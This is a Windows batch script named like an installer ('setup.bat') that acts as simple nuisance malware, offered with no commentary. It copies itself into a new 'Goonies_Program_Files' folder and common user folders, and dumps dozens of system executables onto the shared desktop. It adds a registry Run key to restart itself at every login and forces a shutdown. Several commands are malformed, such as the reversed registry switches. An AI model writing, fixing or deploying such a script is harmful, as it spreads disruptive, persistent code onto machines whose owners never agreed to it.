@echo off
xcopy setup.bat c:\
cd %programfiles%
md Goonies_Program_Files
cd %programfiles%\Goonies_Program_Files
copy c:\setup.bat
cd C:\Documents and Settings\All Users\Documentos
copy c:\Arquivos de programas\Goonies_Program_Files\setup.bat
cd C:\Documents and Settings\All Users\Documents
xcopy %programfiles%
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\arp.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\append.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\alg.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\atmadm.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\autochk.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\autoconv.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\bootcfg.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\bootok.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\blastcln.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\bootvrfy.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\calcs.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\chkdsk.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\cipher.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\cidaemon.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\cisvc.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\ckcnv.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\clspack.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\command.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\comp.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\compact.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\comsdupd.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\control.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\convert.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\csrss.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\dcomcnfg.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\ddeshare.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\debug.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\defrag.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\dfrgfat.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\dfrgntfs.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\diantz.exe
cd C:\Documents and Settings\All Users\Desktop
copy %systemroot%\System32\diskpart.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run v/ Goonies t/ REG_SZ d/ %programfiles%\Goonies_Program_Files\setup.bat
shutdown -f